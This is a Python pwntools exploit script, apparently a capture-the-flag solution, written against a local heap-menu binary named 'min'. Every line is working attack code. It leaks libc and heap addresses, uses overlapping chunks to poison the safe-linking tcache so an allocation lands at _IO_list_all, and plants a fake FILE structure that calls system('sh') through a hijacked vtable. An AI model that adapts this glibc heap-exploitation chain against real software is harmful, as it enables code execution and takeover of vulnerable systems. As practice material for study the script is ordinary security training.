from pwn import *
context(
    terminal = ['tmux','splitw','-h'],
    os = "linux",
    arch = "amd64",
    # arch = "i386",
    log_level="info",
)
def debug(io):
    gdb.attach(io,
'''
# b *$rebase(0x121B)
b 25
'''
)
io = process("./min")

def add_small(content):
    log.info(f'add_small {content}')
    io.sendlineafter(b'1. new\n2. show\n3. delete\n> ',b'1')
    io.sendlineafter(b'Size [1=small / 2=big]: ',b'1')
    io.sendafter(b'Data: ',content)
def add_big(content):
    log.info(f'add_big {content}')
    io.sendlineafter(b'1. new\n2. show\n3. delete\n> ',b'1')
    io.sendlineafter(b'Size [1=small / 2=big]: ',b'2')
    io.sendafter(b'Data: ',content)
def show():
    log.info('show')
    io.sendlineafter(b'1. new\n2. show\n3. delete\n> ',b'2')
def show2(len):
    log.info(f'show {hex(len-1)}*0 + 2')
    io.sendlineafter(b'1. new\n2. show\n3. delete\n> ',b'0'*(len-1) + b'2')
def delete():
    log.info(f'delete')
    io.sendlineafter(b'1. new\n2. show\n3. delete\n> ',b'3')
def delete3(len):
    log.info(f'delete {hex(len-1)}*0 + 3')
    io.sendlineafter(b'1. new\n2. show\n3. delete\n> ',b'0'*(len-1) + b'3')

debug(io)
delete3(0xd59)
add_small(b'x'*0x48 + p64(0xd11))
show2(0x1000)
delete()
add_small(b'x'*0x50)
show()
io.recvuntil(b'x'*0x50)
libc_base = u64(io.recv(0x6).ljust(8,b'\x00')) - 0x219ce0
log.success(hex(libc_base))

delete()
add_small(b'x'*0x48 + p64(0xcf1))
delete()
add_big(b'x')
delete()
add_small(b'x'*0x50)
show()
io.recvuntil(b'x'*0x50)
heap_base = (u64(io.recv(0x5).ljust(8,b'\x00')) - 0x1)*0x1000
log.success(hex(heap_base))
delete()
add_small(b"a" * 0x10 + p64(0) + p64(0x31) + p64(heap_base + 0x12c0) * 2 + p64(0x0) * 2 + p64(0x30) + p64(0xd00))
delete()
add_big(b"a" * 0x50 + p64(0x90) + p64(0x10) + p64(0x00) + p64(0x11))
delete()
add_small(flat({
    0x10:0,
    0x18:0x91,
    0x20:heap_base + 0x1380,
    0x28:libc_base + 0x219ce0,
},filler=b'\x00'))
show2(0xfff)
delete()

add_small(flat({
    0x10 : {
            0x00: 0,
            0x08: 0x91,
            0x10: heap_base + 0x12c0,
            0x18: heap_base + 0x12c0 + 0x30,

            0x30: 0,
            0x38: 0x91,
            0x40: heap_base + 0x12c0,
            0x48: heap_base + 0x12c0 + 0x50,
 
            0x50: 0,
            0x58: 0x91,
            0x60: heap_base + 0x12c0 + 0x30,
            0x68: libc_base + 0x219d60
        }
    }
, filler=b"\x00"))
delete()

add_big(b'x')
delete()
_IO_list_all = libc_base + 0x21a680
system = 0x50d60 + libc_base
 
fake_file = heap_base + 0x12e0
add_small(b"a"*0x10+p64(0) + p64(0x71) + p64((heap_base + 0x12d0 + 0x70)^((heap_base + 0x1000)>>12)))
delete()
add_big(flat({
    0x0+0x10: b"  sh;",
    0x28+0x10: system,
    0x68: 0x71,
    0x70: _IO_list_all ^((heap_base + 0x1000)>>12),
}, filler=b"\x00"))
delete()
add_big(flat({
    0xa0-0x60: fake_file-0x10,
    0xd0-0x60: fake_file+0x28-0x68,
    0xD8-0x60: libc_base + 0x2160C0, # jumptable
}, filler=b"\x00"))
delete()
add_big(p64(fake_file))

io.interactive()
